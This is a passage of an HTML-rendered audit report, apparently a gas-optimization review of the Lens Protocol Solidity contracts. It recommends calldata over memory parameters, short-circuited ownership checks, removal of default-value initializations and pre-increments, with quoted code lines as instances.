);</span></span></code></pre>\n<p>Therefore, the function declaration should use <code>calldata</code> instead of <code>memory</code> for these 3 parameters.</p>\n<p>This optimization is similar to the one for the <code>internal</code> function <code>_createMirror</code>in <code>LensNFTBase.sol</code> which uses <code>bytes calldata referenceModuleData</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">File: LensHub.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">890:     function _createMirror(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">891:         uint256 profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">892:         uint256 profileIdPointed,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">893:         uint256 pubIdPointed,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">894:         address referenceModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">895:         bytes calldata referenceModuleData //@audit-ok : calldata on internal because parent function passes a calldata variable</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">896:     ) internal {</span></span></code></pre>\n<h3 id=\"function-_setfollownfturi\" style=\"position:relative;\"><a href=\"#function-_setfollownfturi\" aria-label=\"function _setfollownfturi permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function _setFollowNFTURI()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">919:     function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal { //@audit gas: should be calldata (calls L255 and L285 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">920:         _profileById[profileId].followNFTURI = followNFTURI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">921:         emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">922:     }</span></span></code></pre>\n<h4 id=\"use-calldata-instead-of-memory-for-string-follownfturi\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory-for-string-follownfturi\" aria-label=\"use calldata instead of memory for string follownfturi permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code> for <code>string followNFTURI</code></h4>\n<p>The parent functions are actually passing a <code>calldata</code> variable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">289:     function setFollowNFTURI(uint256 profileId, string calldata followNFTURI) //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">290:         external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">291:         override</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">292:         whenNotPaused</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">293:     {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">294:         _validateCallerIsProfileOwnerOrDispatcher(profileId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">295:         _setFollowNFTURI(profileId, followNFTURI); //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">296:     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">299:     function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars) //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">300:         external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">301:         override</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">302:         whenNotPaused</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">303:     {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">325:         _setFollowNFTURI(vars.profileId, vars.followNFTURI); //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">326:     }</span></span></code></pre>\n<p>Therefore, the function declaration should use <code>calldata</code> instead of <code>memory</code> for <code>string followNFTURI</code></p>\n<p>This optimization is similar to the one for the <code>internal</code> function <code>_createMirror</code>in <code>LensNFTBase.sol</code> which uses <code>bytes calldata referenceModuleData</code>.</p>\n<h3 id=\"function-_validatecallerisprofileownerordispatcher\" style=\"position:relative;\"><a href=\"#function-_validatecallerisprofileownerordispatcher\" aria-label=\"function _validatecallerisprofileownerordispatcher permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function _validateCallerIsProfileOwnerOrDispatcher()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">940:     function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">941:         if (msg.sender != ownerOf(profileId) &amp;&amp; msg.sender != _dispatcherByProfile[profileId]) //@audit gas: this is a sad path with 2 SLOADs. A happy path is possible</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">942:             revert Errors.NotProfileOwnerOrDispatcher();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">943:     }</span></span></code></pre>\n<h4 id=\"short-circuiting-can-provide-a-happy-path-1\" style=\"position:relative;\"><a href=\"#short-circuiting-can-provide-a-happy-path-1\" aria-label=\"short circuiting can provide a happy path 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Short-circuiting can provide a happy path</h4>\n<p>The current implementation of function <code>_validateCallerIsProfileOwnerOrDispatcher</code> favors a <strong>sad path</strong> which will always cost <strong>2 SLOADs</strong> to check the condition.\nIt’s possible to <strong>short-circuit</strong> this condition to provide a <strong>happy path</strong> which may cost <strong>only 1 SLOAD</strong> instead.\nI suggest rewriting the function to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender == ownerOf(profileId) || msg.sender == _dispatcherByProfile[profileId]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert Errors.NotProfileOwnerOrDispatcher();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h2 id=\"file-lensnftbasesol\" style=\"position:relative;\"><a href=\"#file-lensnftbasesol\" aria-label=\"file lensnftbasesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File: LensNFTBase.sol</h2>\n<h3 id=\"function-_validaterecoveredaddress\" style=\"position:relative;\"><a href=\"#function-_validaterecoveredaddress\" aria-label=\"function _validaterecoveredaddress permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function _validateRecoveredAddress()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">159:     function _validateRecoveredAddress(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">160:         bytes32 digest,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">161:         address expectedAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">162:         DataTypes.EIP712Signature memory sig //@audit gas: should be calldata (calls L78, L111 and L152 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">163:     ) internal view {</span></span></code></pre>\n<h4 id=\"use-calldata-instead-of-memory\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory\" aria-label=\"use calldata instead of memory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code></h4>\n<p>The calls to the <code>internal</code> function <code>_validateRecoveredAddress</code> pass a <code>calldata</code> variable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">51:     function permit(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">52:         address spender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">53:         uint256 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">54:         DataTypes.EIP712Signature calldata sig //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">55:     ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">78:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">83:     function permitForAll(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">84:         address owner,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">85:         address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">86:         bool approved,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">87:         DataTypes.EIP712Signature calldata sig //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">88:     ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">111:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">127:     function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig) //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">152:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata</span></span></code></pre>\n<p>Therefore, the function declaration should use <code>calldata</code> instead of <code>memory</code></p>\n<p>This optimization is similar to the one for the <code>internal</code> function <code>_createMirror</code>in <code>LensNFTBase.sol</code> which uses <code>bytes calldata referenceModuleData</code>.</p>\n<h2 id=\"file-publishinglogicsol\" style=\"position:relative;\"><a href=\"#file-publishinglogicsol\" aria-label=\"file publishinglogicsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File: PublishingLogic.sol</h2>\n<h3 id=\"function-_initfollowmodule\" style=\"position:relative;\"><a href=\"#function-_initfollowmodule\" aria-label=\"function _initfollowmodule permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function _initFollowModule()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">342:     function _initFollowModule(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">343:         uint256 profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">344:         address followModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">345:         bytes memory followModuleData, //@audit gas: should be calldata (calls L64 and L95 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">346:         mapping(address =&gt; bool) storage _followModuleWhitelisted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">347:     ) private returns (bytes memory) {</span></span></code></pre>\n<h4 id=\"use-calldata-instead-of-memory-1\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory-1\" aria-label=\"use calldata instead of memory 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code></h4>\n<p>The calls to the <code>private</code> function <code>_initFollowModule</code> pass a <code>calldata</code> variable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">39:     function createProfile(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">40:         DataTypes.CreateProfileData calldata vars, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">61:         bytes memory followModuleReturnData = _initFollowModule(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">62:             profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">63:             vars.followModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">64:             vars.followModuleData, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">65:             _followModuleWhitelisted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">66:         );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">80:     function setFollowModule(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">81:         uint256 profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">82:         address followModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">83:         bytes calldata followModuleData, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">92:         bytes memory followModuleReturnData = _initFollowModule(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">93:             profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">94:             followModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">95:             followModuleData, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">96:             _followModuleWhitelisted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">97:         );</span></span></code></pre>\n<p>Therefore, the function declaration should use <code>calldata</code> instead of <code>memory</code></p>\n<p>This optimization is similar to the one for the <code>internal</code> function <code>_createMirror</code>in <code>LensNFTBase.sol</code> which uses <code>bytes calldata referenceModuleData</code>.</p>\n<h2 id=\"general-recommendations\" style=\"position:relative;\"><a href=\"#general-recommendations\" aria-label=\"general recommendations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>General recommendations</h2>\n<h3 id=\"variables\" style=\"position:relative;\"><a href=\"#variables\" aria-label=\"variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Variables</h3>\n<h4 id=\"no-need-to-explicitly-initialize-variables-with-default-values\" style=\"position:relative;\"><a href=\"#no-need-to-explicitly-initialize-variables-with-default-values\" aria-label=\"no need to explicitly initialize variables with default values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>No need to explicitly initialize variables with default values</h4>\n<p>If a variable is not set/initialized, it is assumed to have the default value (<code>0</code> for <code>uint</code>, <code>false</code> for <code>bool</code>, <code>address(0)</code> for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.</p>\n<p>As an example: <code>for (uint256 i = 0; i &#x3C; numIterations; ++i) {</code> should be replaced with <code>for (uint256 i; i &#x3C; numIterations; ++i) {</code></p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i &lt; toCheck.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\FollowNFT.sol:120:        uint256 lower = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\FollowNFT.sol:162:        uint256 lower = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\LensHub.sol:541:        for (uint256 i = 0; i &lt; vars.datas.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i &lt; profileIds.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; i &lt; byteHandle.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">upgradeability\\VersionedInitializable.sol:29:    uint256 private lastInitializedRevision = 0;</span></span></code></pre>\n<p>I suggest removing explicit initializations for default values.</p>\n<h4 id=\"pre-increments-cost-less-gas-compared-to-post-increments\" style=\"position:relative;\"><a href=\"#pre-increments-cost-less-gas-compared-to-post-increments\" aria-label=\"pre increments cost less gas compared to post increments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pre-increments cost less gas compared to post-increments</h4>\n<p>As the solution employs pre-increments for all of its for-loops, I’m sure the sponsor is aware of the fact that pre-increments cost less gas compared to post-increments (about 5 gas)</p>\n<p>However, some places outside loops were missed.</p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\collect\\LimitedFeeCollectModule.sol:112:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\collect\\LimitedTimedFeeCollectModule.sol:123:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\LensHub.sol:887:        _profileById[vars.profileId].pubCount++;</span></span></code></pre>\n<p>I suggest only replacing these, as some other places in the solution are actually using post-increments the right way. The logic would break if those other places (not mentioned here) are changed too.</p>\n<h3 id=\"for-loops\" style=\"position:relative;\"><a href=\"#for-loops\" aria-label=\"for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>For-Loops</h3>\n<h4 id=\"increments-can-be-unchecked\" style=\"position:relative;\"><a href=\"#increments-can-be-unchecked\" aria-label=\"increments can be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" 